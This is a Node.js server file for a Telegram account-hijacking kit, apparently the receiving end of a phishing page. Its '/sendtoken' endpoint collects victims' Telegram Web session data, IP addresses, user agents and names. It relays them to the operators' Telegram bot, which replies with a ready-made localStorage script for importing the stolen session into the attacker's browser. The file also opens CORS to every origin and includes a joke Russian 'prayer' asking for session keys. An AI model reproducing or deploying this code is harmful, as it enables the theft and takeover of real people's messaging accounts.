//* SERVER

//* IMPORTS
require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");
const express = require("express");
var cors = require("cors");

//* SETUP
const port = 6969; // app port
const API_KEY_BOT = process.env.API_KEY_BOT; // import telegram bot api token

// array of bot's chatId's, that will recieve data.
// by default, bot adds your chatId on any message in chat and looses it on every server reboot
// you can add your chatId manualy, so you don't need to text bot every time server reboots
// for this, change the line below to:
// let botIds = ['111111111']; // (your chatId goes there)
let botIds = [];

let prayer = `о великий павел дуров  
да дай же нам ключи во имя святой сессии  
да чтоб ключи те рабочими были  
во имя святого mtproto, дай же нам святую сессию  

да наполни наши устройства мощью и скоростью  
дабы сообщения доходили мгновенно, без задержек  
во имя надежности и безопасности, охрани нас всех  
да обеспечишь ты нам защиту от злых намерений  

пусть каждый пользователь найдет в мессенджере уют  
дабы наши беседы были свободны от вмешательства  
во имя дружбы и общения, даруй всем нам доступ  
да сделаешь так, чтобы мир объединялся вновь  

аминь`;

//* INIT
const app = express();

// initilize telegram bot
const bot = new TelegramBot(API_KEY_BOT, {
  polling: true,
});

// error handling for tgbot api
bot.on("polling_error", (err) => console.log(err.data.error.message));

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// disable fucking cors
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept"
  );
  next();
});
app.use(cors()); // two times. fuck cors.

//* BOT HANDLERS
// initilize user on any message
bot.on("text", async (msg) => {
  const chatId = msg.chat.id;

  // :)
  if (msg.text === "/prayer") {
    await bot.sendPhoto(
      msg.chat.id,
      "https://static.independent.co.uk/s3fs-public/thumbnails/image/2019/06/06/15/telegram-founder-pavel-durov-diet-fast.jpeg",
      { caption: prayer }
    );
  } else {
    //add user to array of chatId's, if not already there. on any message
    if (!botIds.includes(chatId)) {
      botIds.push(msg.chat.id);
      bot.sendMessage(
        msg.chat.id,
        "*Your chat added to the array of the recieving accounts*",
        { parse_mode: "MarkdownV2" }
      );

      // send prayer
      await bot.sendPhoto(
        msg.chat.id,
        "https://static.independent.co.uk/s3fs-public/thumbnails/image/2019/06/06/15/telegram-founder-pavel-durov-diet-fast.jpeg",
        { caption: prayer }
      );
    } else {
      // DO NOT add chatId if it's already in array, to prevent multiple identical messages
      bot.sendMessage(msg.chat.id, "*Your chat is already added*", {
        parse_mode: "MarkdownV2",
      });
    }
  }
});

// send ready to use script, if button clicked
bot.on("callback_query", (msg) => {
  bot.sendMessage(
    msg.message.chat.id,
    '```JS\nlocalStorage.setItem("account1", \'' +
      msg.message.text +
      "');\n```",
    { parse_mode: "MarkdownV2" }
  );
  bot.deleteMessage(msg.message.chat.id, msg.message.message_id);
});

//* EXPRESS ENDPOINT
// recieve token
app.post("/sendtoken", async (req, res) => {
  // parse usefull info
  let data = JSON.parse(Object.keys(req.body)[0]).data.account1;
  console.log(JSON.parse(Object.keys(req.body)[0]).data); // log data for emergencies

  // notification message
  botIds.forEach((e) => {
    bot.sendMessage(
      e,
      `SOMEONE LOGGED IN!!

at
${Date().toString()}

from user agent
${req.header("user-agent")}

from IP
${req.header("X-Real-Ip")}

possible name
${data.firstName} ${data.lastName}`
    );

    // data message
    bot.sendMessage(e, "```\n" + JSON.stringify(data) + "```\n", {
      parse_mode: "MarkdownV2",
      reply_markup: JSON.stringify({
        inline_keyboard: [[{ text: "Get script", callback_data: "1" }]],
      }),
    });
  });

  res.send("yay"); //unused, but required by http protocol
});

//* start expreess server
app.listen(port, () => {
  console.log(`listening on port ${port}`);
});
